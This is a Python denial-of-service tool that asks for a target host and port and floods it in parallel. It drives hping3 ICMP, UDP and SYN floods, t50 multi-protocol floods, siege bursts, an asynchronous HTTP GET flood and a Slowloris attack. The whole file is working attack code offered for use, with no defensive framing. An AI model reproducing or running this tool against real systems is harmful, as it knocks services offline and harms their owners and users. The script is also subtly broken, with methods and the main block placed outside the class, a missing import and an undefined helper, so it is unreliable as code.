    #!/usr/bin/python3

    import os
    import subprocess
    import socket
    import random
    import asyncio
    import aiohttp
    import time
    import logging
    from concurrent.futures import ThreadPoolExecutor, as_completed
    from colorama import Fore, Style, init
    
    # Инициализация colorama и логирования
    init(autoreset=True)
    logging.basicConfig(filename='attack_log.txt', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    
    os.system("clear")
    os.system("figlet KALINUX SECURITY RESPONDER")
    
    class AttackManager:
        def __init__(self, target_ip, target_port=80, num_requests=1000, max_threads=4, attack_duration=30):
            self.target_ip = target_ip
            self.target_port = target_port
            self.num_requests = num_requests
            self.max_threads = max_threads
            self.attack_duration = attack_duration
            self.protocol_methods = {
                "UDP": self.udp_flood,
                "TCP": self.tcp_syn_flood,
                "HTTP": self.run_http_attack,
                "T50": self.t50_attack,
                "Siege": self.siege_attack,
                "Hping3": self.hping3_attack,
                "Slowloris": self.slowloris_attack,
                "ICMP": self.icmp_flood
            }

    def resolve_ip(self):
        try:
            resolved_ip = socket.gethostbyname(self.target_ip)
            logging.info(f"[#] Target IP: {resolved_ip}")
            return resolved_ip
        except socket.gaierror:
            logging.error("Invalid target domain.")
            sys.exit(1)

    def icmp_flood(self):
        command = f"sudo hping3 {self.target_ip} --icmp --flood"
        subprocess.run(command, shell=True)


    def udp_flood(self):
        command = f"sudo hping3 {self.target_ip} --udp --flood -p {self.target_port}"
        subprocess.run(command, shell=True)

    def tcp_syn_flood(self):
        command = f"sudo hping3 {self.target_ip} -S -p {self.target_port} --flood"
        subprocess.run(command, shell=True)

    async def http_flood(self, session, url):
        headers = {"User-Agent": "Mozilla/5.0", "Connection": "keep-alive"}
        try:
            async with session.get(url, headers=headers) as response:
                logging.info(f"Sent GET request to {url}, Status: {response.status}")
        except Exception as e:
            logging.error(f"Error in HTTP request: {e}")

    async def run_http_attack(self):
        url = f"http://{self.target_ip}:{self.target_port}/{self.generate_random_path()}"
        async with aiohttp.ClientSession() as session:
            tasks = [self.http_flood(session, url) for _ in range(self.num_requests)]
            await asyncio.gather(*tasks)

    def slowloris_attack(self):
        sockets = []
        try:
            for _ in range(self.num_requests):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((self.target_ip, self.target_port))
                s.send("GET / HTTP/1.1\r\n".encode("utf-8"))
                sockets.append(s)
            while sockets:
                for s in sockets:
                    try:
                        s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
                    except socket.error:
                        sockets.remove(s)
                time.sleep(15)
        except Exception as e:
            logging.error(f"Slowloris error: {e}")

    def hping3_attack(self):
        commands = [
           f"sudo hping3 -A {self.target_ip} -p {self.target_port} --flood",
           f"sudo hping3 -S {self.target_ip} -p {self.target_port} --flood -d 1000",
           f"sudo hping3 -2 {self.target_ip} -p {self.target_port} -s 1024-65535 --flood",
           f"sudo hping3 -2 {self.target_ip} -p {self.target_port} --flood --interval u1000",
           f"sudo hping3 {self.target_ip} -p {self.target_port} --flood",
           f"sudo hping3 {self.target_ip} -p {self.target_port} --flood",
           f"sudo hping3 -1 {self.target_ip} -p {self.target_port} --flood --interval u10",
           f"sudo hping3 -1 {self.target_ip} -p {self.target_port} --flood",
           f"sudo hping3 -0 {self.target_ip} -p {self.target_port} --flood --interval u1000",
           ]
        for command in commands:
           self.run_command(command, "Hping3 attack")


    def t50_attack(self):
        commands = [
            f"sudo t50 {self.target_ip} --protocol TCP --flood --dport {self.target_port}",
            f"sudo t50 {self.target_ip} --protocol ICMP --flood",
            f"sudo t50 {self.target_ip} --protocol UDP --flood --dport {self.target_port}",
            f"sudo t50 {self.target_ip} --protocol IPSEC --flood",
            f"sudo t50 {self.target_ip} --protocol DCCP --flood",
            f"sudo t50 {self.target_ip} --protocol T50 --flood --dport {self.target_port}",
            ]
        for command in commands:
            self.run_command(command, "T50 attack")

    # Методы атак для siege
    def siege_attack(self):
        commands = [
            f"siege -t 1m {self.target_ip}",
            f"siege -c 100 -t 1m {self.target_ip}",
            f"siege -c 200 -t 5m {self.target_ip}",
            f"siege -c 500 -t 1m -r 5 {self.target_ip}",
            f"siege -c 500 -t 5m -r 10 {self.target_ip}",
            f"siege -c 500 -t 5m -r 29 {self.target_ip}",
            ]
        for command in commands:
            self.run_command(command, "Siege attack")

    #    profits from this type of code building is possibility to add/or configure that much attacks as you want.

    def run_command(self, command, description):
        try:
           subprocess.run(command, shell=True, timeout=self.attack_duration)
           logging.info(f"{description} completed.")
        except subprocess.TimeoutExpired:
           logging.warning(f"{description} timed out.")
        except Exception as e:
           logging.error(f"Error during {description}: {e}")


    def execute_attack(self, protocol):
        if protocol == "HTTP":
            asyncio.run(self.run_http_attack())
        elif protocol in self.protocol_methods:
            self.protocol_methods[protocol]()
        else:
            logging.error(f"Invalid protocol: {protocol}")

    def start_parallel_attacks(self, protocols):
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = [executor.submit(self.execute_attack, protocol) for protocol in protocols]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logging.error(f"Error during parallel execution: {e}")

    def start_attack_sequence(self):
        print("Choose attack method(s):\n1. ICMP\n2. UDP\n3. TCP\n4. HTTP\n5. Slowloris\n6. T50\n7. Siege")
        method = input("Enter method numbers separated by commas: ")

        protocol_map = {"1": "ICMP", "2": "UDP", "3": "TCP", "4": "HTTP", "5": "Slowloris", "6": "T50", "7": "Siege"}
        selected_protocols = [protocol_map.get(m.strip()) for m in method.split(",") if protocol_map.get(m.strip())]

        if selected_protocols:
            print(Fore.RED + f"Starting attack(s): {', '.join(selected_protocols)}...")
            self.start_parallel_attacks(selected_protocols)
        else:
            print(Fore.RED + "Invalid selection.")

    if __name__ == "__main__":
        target_host = input(Fore.BLUE + "Enter target host (IP or domain): " + Style.RESET_ALL)
        target_port = int(input(Fore.BLUE + "Enter target port (default 80): " + Style.RESET_ALL) or 80)
        num_requests = int(input(Fore.BLUE + "Enter number of requests for HTTP Flood (default 1000): " + Style.RESET_ALL) or 1000)
        max_threads = int(input(Fore.BLUE + "Enter max threads (default 4): " + Style.RESET_ALL) or 4)

    manager = AttackManager(target_host, target_port, num_requests, max_threads)
    manager.start_attack_sequence()
